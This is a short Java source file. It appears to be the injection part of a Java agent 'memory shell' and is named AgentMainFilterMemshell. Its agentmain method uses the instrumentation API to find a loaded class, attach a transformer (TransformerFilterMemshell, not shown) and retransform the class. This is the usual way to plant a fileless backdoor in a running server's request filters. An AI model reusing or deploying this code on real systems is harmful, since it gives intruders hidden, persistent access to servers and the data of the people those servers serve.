import java.lang.instrument.Instrumentation;

public class AgentMainFilterMemshell {
    public static void agentmain(String agentArgs, Instrumentation inst) {
        Class<?>[] classes = inst.getAllLoadedClasses();
        for (Class<?> aClass : classes) {
            if (aClass.getName().equals(TransformerFilterMemshell.editClassName)) {
                inst.addTransformer(new TransformerFilterMemshell(), true);
                try {
                    inst.retransformClasses(aClass);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
    }
}